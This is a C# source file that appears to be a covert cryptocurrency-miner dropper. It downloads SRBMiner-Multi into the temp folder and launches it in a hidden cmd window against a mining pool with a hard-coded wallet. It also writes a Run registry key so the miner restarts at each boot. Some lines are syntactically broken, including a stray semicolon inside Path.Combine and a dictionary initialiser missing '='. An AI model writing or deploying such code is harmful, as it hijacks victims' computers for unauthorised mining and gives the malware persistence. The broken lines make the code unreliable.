using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;

namespace miis
{
    public class Program
    {
        private static string 	ThisIsMe 			= "MIIS";
        private static string 	Algo 				= "yespower";
        private static string 	PoolAddr 			= "stratum+tcp://europe.mining-dutch.nl:9986";
        private static string 	Wallet 				= "senery";
        private static string 	ZipUrl 				= "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-win64.zip";
        private static string 	RootDir 			= Path.GetTempPath();
		private static string 	LogFile 			= Path.Combine(ROOTDIR,		"log.txt";);
        private static string 	SaveZip 			= Path.Combine(RootDir, 	"temp.zip");
        private static string 	SaveCmdFile 		= Path.Combine(RootDir, 	"cmdline.txt");
        private static string 	ExeToUse 			= Path.Combine(RootDir, 	"SRBMiner-Multi-2-4-6", "SRBMiner-MULTI.exe");
        private static string 	SaveBatchFile 		= Path.Combine(RootDir, 	"svc.cmd");
		private static string 	BatchFilePrompt 	= "START /B /I /MIN " + Path.Combine(RootDir, "svc.cmd");
        private static string 	BatchTemplateFile 	= "template.tpl";
        private static string[] FileListMiner 		= {"WinRing-x64.sys", "SRBMiner-MULTI.exe", "template.tpl" };
        private static string[] FileListConfigs 	= { SaveZip, SaveCmdFile, SaveBatchFile };
		private static string 	CmdLine 			= $"{ExeToUse} -a yespower -o {PoolAddr} -u {Wallet} -p n=r --cpu-priority 1 -q";
        
		private static  Dictionary<string, string> TemplateDict new Dictionary<string, string> {
            ["[#ROOTDIR#]"] = RootDir,
            ["[#DISABLEGPU#]"] = "",
            ["[#ALGO#]"] = Algo,
            ["[#POOL#]"] = PoolAddr,
            ["[#WALLET#]"] = Wallet
        };
		
		/*
			##### MAIN #####
		
		*/
        private static void Main(string[] args)
        {
            /* get miner files */
            DownloadAndSave(ZipUrl, SaveZip, true);
            /* run wat */
            RunMyShizzle();
            /* Create cmd file */
            CreateBatchByTemplate();
            /* fix the on boot */
            AddToStartupRegistry();
        }
	
	/*
	*	Delete all files in string array[]
	*/
    private static void DeleteFilesInFileList()
    {
        foreach (var configFile in FileListConfigs)
        {
            string filePath = Path.Combine(RootDir, configFile);
            if (File.Exists(filePath)){ try {File.Delete(filePath);} catch (Exception e){
				DebugLogEx($"DeleteFilesInFileListConfig:NotDeleted: {filePath}", e);
				} 
			} 
		}
    }

    private static void DeleteFilesInFileListStatic()
    {
        foreach (var minerFile in FileListMiner)
        {
            string filePath = Path.Combine(RootDir, minerFile);
            if (File.Exists(filePath))
            {
                    try
                    {
                        File.Delete(filePath);
                        DebugLogEx($"DeleteFilesInFileList:Deleted: {filePath}", null);
                    } catch (Exception e) { DebugLogEx($"DeleteFilesInFileList:NotDeleted: {filePath}", e); }
                    finally { }
            }
        }
    }

    private static string CreateBatchByTemplate()
    {
        string batchTemplate;

        try
        {
            batchTemplate = File.ReadAllText(BatchTemplateFile);
            DebugLogEx($"CreateBatchByTemplate:Readok: {batchTemplate}", null);

            if (batchTemplate != null && TemplateDict != null)
            {
                foreach (var kvp in TemplateDict)
                {
                    string key = kvp.Key;
                    string value = kvp.Value;
                    batchTemplate = batchTemplate.Replace(key, value);
                    DebugLogEx($"CreateBatchByTemplate:Replace: {key}=>{value}", null);
                }
				WriteBatchFile(batchTemplate);
            return SaveBatchFile;
            }
        }
        catch (Exception e)
        {
            DebugLogEx($"CreateBatchByTemplate:ReadError", e);
        }
            return SaveBatchFile;
    }

    private static string WriteBatchFile(string output = null)
    {
        try
        {
            File.Delete(SaveBatchFile);
            File.WriteAllText(SaveBatchFile, output);
                return SaveBatchFile;
        }
        catch (Exception e)
        {
            DebugLogEx($"WriteBatchFile:Error: {output}", e);
        }
            return null; 
    }

    private static void DownloadAndSave(string url, string saveAs, bool doExtract = false)
    {
        WebClient web = new WebClient();

        try {
            web.DownloadFile(url, saveAs);

            if (doExtract)
            {
                ExtractZip(saveAs);
            }
        }
        catch (Exception e) { DebugLogEx("DownloadAndSave: url= "+ url+ " saveAs= " + saveAs, e); }
            finally { web.Dispose(); }

        
    }

    private static void ExtractZip(string zipPath)
    {
        try
        {
            ZipFile.ExtractToDirectory(zipPath, RootDir);
            DebugLogEx("DownloadAndSave:Extracted", null);
        }
        catch (Exception e)
        {
            DebugLogEx("DownloadAndSave:Extracted:Error", e);
        }
    }

    private static void AddToStartupRegistry()
    {
        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue(ThisIsMe, BatchFilePrompt);
                DebugLogEx($"AddToStartupRegistry:SetKey:{ThisIsMe}: {SaveBatchFile}", null);
            }
        }
        catch (Exception e)
        {
            DebugLogEx("Error adding to startup registry", e);
        }
    }

    private static void RunMyShizzle()
    {
        try
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = CmdLine
            };
            process.Start();
        }
        catch (Exception e)
        {
            DebugLogEx("RunMyShizzle:Error: ", e);
        }
    }


    private static void DebugLogEx(string debugMessage, Exception ex = null)
    {
        var errorMessage = ex != null ? $"{debugMessage}\n\n{ex.GetBaseException().Message}" : debugMessage;
        Console.Write(errorMessage);
        DebugLogToFile(errorMessage);
    }

    private static void DebugLogToFile(string debugMessage)
    {
        try
        {
            File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "LOGFILENAME"),
                $"{DateTime.Now:G} : {debugMessage}\n\n");
        }
        catch (Exception e)
        {
            DebugLogEx("DebugLogToFile:Error: ", e);
        }
    }
}
}
